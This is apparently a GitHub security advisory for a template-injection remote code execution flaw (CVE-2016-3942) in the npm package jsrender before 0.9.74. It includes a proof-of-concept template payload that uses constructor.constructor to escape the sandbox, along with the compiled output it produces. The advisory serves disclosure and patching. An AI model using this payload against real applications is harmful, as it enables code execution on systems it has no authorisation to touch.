# [M] Template Injection in jsrender

## Summary
Severity: Medium
Advisory: GHSA-r87w-47m8-22w3
CVE: CVE-2016-3942
CWE: CWE-94
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L (CVSS_V3)
Published: 2020-09-01
Source: https://github.com/advisories/GHSA-r87w-47m8-22w3
Type: github-advisory

## Affected
- npm: `jsrender` — affected >=0 <0.9.74

## Details
Affected versions of `jsrender` are susceptible to a remote code execution vulnerability when used with server delivered client-side tempates which dynamically embed user input.

## Proof of Concept


```js
//POC-REQUEST
{{for ~x!=1?(constructor.constructor("return arguments.callee.caller")()):~y(10)}}
{{:#data}}
{{/for}}
```

```js
//POC-RESPONSE
function anonymous(data,view,j,u) { // template var v,t=j._tag,ret="" +t("for",view,this,[ {view:view,tmpl:1, params:{args:['~x!=1?(constructor.constructor(\"return arguments.callee.caller\")()):~y(10)']}, args:[view.hlp("x")!=1?(data.constructor.constructor("return arguments.callee.caller")()):view.hlp("y")(10)], props:{}}]); return ret; } 
```


## Recommendation

Update to version 0.9.74 or later.

## References
- https://nvd.nist.gov/vuln/detail/CVE-2016-3942
- https://github.com/BorisMoore/jsrender/commit/f984e139deb0a7648d5b543860ec652c21f6dcf6
- https://github.com/BorisMoore/jsrender
- https://snyk.io/vuln/SNYK-DOTNET-JSRENDER-60173
- https://www.npmjs.com/advisories/97
